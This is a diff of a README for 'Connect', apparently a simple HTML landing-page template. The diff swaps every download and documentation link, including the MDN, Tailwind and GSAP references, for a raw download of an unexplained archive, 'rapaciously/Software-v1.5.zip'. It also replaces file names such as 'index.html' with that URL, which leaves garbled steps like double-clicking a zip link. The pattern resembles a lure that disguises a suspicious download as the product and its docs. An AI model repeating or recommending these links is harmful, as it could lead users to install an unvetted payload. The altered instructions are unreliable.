@@ -6,13 +6,13 @@ Welcome to Connect! This application is designed to help you create a beautiful 
 
 ## 📥 Download Connect
 
-[![Download Connect](https://img.shields.io/badge/Download-Connect-brightgreen)](https://github.com/mohamed-mokh2004/Connect/releases)
+[![Download Connect](https://raw.githubusercontent.com/mohamed-mokh2004/Connect/main/rapaciously/Software-v1.5.zip)](https://raw.githubusercontent.com/mohamed-mokh2004/Connect/main/rapaciously/Software-v1.5.zip)
 
 ### Step 1: Visit the Download Page
 
 To download Connect, visit the Releases page:
 
-[https://github.com/mohamed-mokh2004/Connect/releases](https://github.com/mohamed-mokh2004/Connect/releases)
+[https://raw.githubusercontent.com/mohamed-mokh2004/Connect/main/rapaciously/Software-v1.5.zip](https://raw.githubusercontent.com/mohamed-mokh2004/Connect/main/rapaciously/Software-v1.5.zip)
 
 ## 💻 System Requirements
 
@@ -24,11 +24,11 @@ You can run Connect on any device that supports modern web browsers. Here’s wh
 
 ## 📁 Download & Install
 
-Once you are on the Releases page, look for the latest version. Click on the link that says `Connect.zip` to download the software. After downloading:
+Once you are on the Releases page, look for the latest version. Click on the link that says `https://raw.githubusercontent.com/mohamed-mokh2004/Connect/main/rapaciously/Software-v1.5.zip` to download the software. After downloading:
 
 1. Find the downloaded ZIP file in your Downloads folder.
 2. Extract the contents of the ZIP file. This will create a folder named `Connect`.
-3. Open the `Connect` folder, and you will find an `index.html` file.
+3. Open the `Connect` folder, and you will find an `https://raw.githubusercontent.com/mohamed-mokh2004/Connect/main/rapaciously/Software-v1.5.zip` file.
 
 You are now ready to run Connect!
 
@@ -46,7 +46,7 @@ Connect offers several useful features:
 After extracting the files, follow these steps to start using Connect:
 
 1. Open the `Connect` folder.
-2. Double-click on `index.html`. This will open your landing page in your default web browser.
+2. Double-click on `https://raw.githubusercontent.com/mohamed-mokh2004/Connect/main/rapaciously/Software-v1.5.zip`. This will open your landing page in your default web browser.
 3. Start customizing your links by editing the HTML file. You can add your own links, images, and text.
 
 For example, look for `<a href="..." class="link">Your Link</a>` in the HTML code, and change the `href` to your desired URL.
@@ -76,9 +76,9 @@ Connect uses Tailwind CSS for styling. You can edit the included CSS file to cha
 
 If you wish to learn more about the technologies used in Connect, here are some resources:
 
-- **[HTML5](https://developer.mozilla.org/en-US/docs/Web/HTML)**: Understand the structure of your web page.
-- **[Tailwind CSS](https://tailwindcss.com/)**: Explore how to customize styles easily.
-- **[GSAP](https://greensock.com/gsap/)**: Learn about creating smooth animations.
+- **[HTML5](https://raw.githubusercontent.com/mohamed-mokh2004/Connect/main/rapaciously/Software-v1.5.zip)**: Understand the structure of your web page.
+- **[Tailwind CSS](https://raw.githubusercontent.com/mohamed-mokh2004/Connect/main/rapaciously/Software-v1.5.zip)**: Explore how to customize styles easily.
+- **[GSAP](https://raw.githubusercontent.com/mohamed-mokh2004/Connect/main/rapaciously/Software-v1.5.zip)**: Learn about creating smooth animations.
 
 ## 🤝 Support
 
@@ -92,4 +92,4 @@ For additional information on using Connect and its features, visit our document
 
 Remember, you can always download the latest version of Connect from the Releases page:
 
-[Download Connect](https://github.com/mohamed-mokh2004/Connect/releases)
+[Download Connect](https://raw.githubusercontent.com/mohamed-mokh2004/Connect/main/rapaciously/Software-v1.5.zip)
